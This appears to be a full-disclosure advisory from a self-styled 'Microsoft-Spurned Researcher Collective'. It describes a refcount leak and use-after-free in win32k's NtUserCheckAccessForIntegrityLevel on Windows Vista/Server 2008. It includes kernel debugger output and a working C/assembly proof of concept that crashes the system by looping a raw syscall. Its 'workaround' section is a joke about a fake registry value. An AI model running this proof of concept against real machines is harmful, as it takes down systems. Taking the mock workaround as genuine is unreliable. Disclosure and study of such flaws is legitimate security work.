@@ -1,0 +1,77 @@
+Windows Vista/Server 2008 NtUserCheckAccessForIntegrityLevel Use-after-free Vulnerability
+
+Intro:
+
+Due to hostility toward security researchers, the most recent example being of Tavis Ormandy, a number of us from the industry (and some not from the industry) have come together to form MSRC: the Microsoft-Spurned Researcher Collective.  MSRC will fully disclose vulnerability information discovered in our free time, free from retaliation against us or any inferred employer.
+
+Vulnerability report:
+
+win32k!NtUserCheckAccessForIntegrityLevel in Vista/Server 2008 calls LockProcessByClientId() on the specified ClientID. When this call fails, the refcount will be first decremented by nt!ObfDereferenceObject and then by win32k!NtUserCheckAccessForIntegrityLevel again, resulting in a refcount leak.  The refcount leak can be abused to have an in-use process object deleted. (use-after-free)
+
+Some debugging info:
+
+kd> vertarget
+Windows Server 2008 Kernel Version 6002 (SP2)
+kd> LM m win32k
+start    end        module name
+8d460000 8d663000   win32k
+kd> BA e 1 8d58d710 \"dt nt!_OBJECT_HEADER @edx PointerCount; g\"
+kd> g
+   +0x000 PointerCount : 145
+   +0x000 PointerCount : 144
+   +0x000 PointerCount : 143
+...
+   +0x000 PointerCount : 3
+   +0x000 PointerCount : 2
+   +0x000 PointerCount : 1
+*** Fatal System Error: 0x00000018
+kd> kc
+nt!KeBugCheck2
+nt!ObfDereferenceObject
+win32k!NtUserCheckAccessForIntegrityLevel
+nt!KiFastCallEntry
+
+The vulnerability can be triggered in one line below, where 4 is just the PID of PsInitialSystemProcess.
+
+while (1) NtUserCheckAccessForIntegrityLevel(4, 0, NULL);
+
+Since there's no exported stub for this system call, you'll have to craft the call manually. sysenter is your friend.
+
+http://j00ru.vexillium.org/win32k_syscalls/
+
+POC:
+#include <windows.h>
+#define LEAK_ME 0x1151
+int main(int argc, char *argv[])
+{
+    /* get us some win32k! */
+    LoadLibrary("user32");
+    while (1) {
+        __asm {
+           mov eax, LEAK_ME
+           push 0
+           push 0
+           push 4
+           lea edx, dword ptr [esp]
+           int 0x2e
+        }
+     }
+}
+
+Workaround:
+
+Microsoft can workaround these advisories by locating the following registry key: HKCU\\Microsoft\\Windows\\CurrentVersion\\Security and changing the "OurJob" boolean value to FALSE.
+
+We at MSRC would like to help you, the users, work around this issue, but PatchGuard will not allow us ;-(
+
+Current MSRC Members (alphabetical order!):
+XX XXXXXX
+XXXX XXXXXXXX
+XXXXX XXX
+XXXXXXX XXXXXXX
+XXXXXX XXXXXXXXX
+XXXXX XXXXXXXX
+
+If you wish to responsibly disclose a vulnerability through full disclosure or want to join our team, fire off an email to: msrc-disclosure () hushmail com
+
+We do have a vetting process by the way, for any Microsoft employees trying to join ;-)
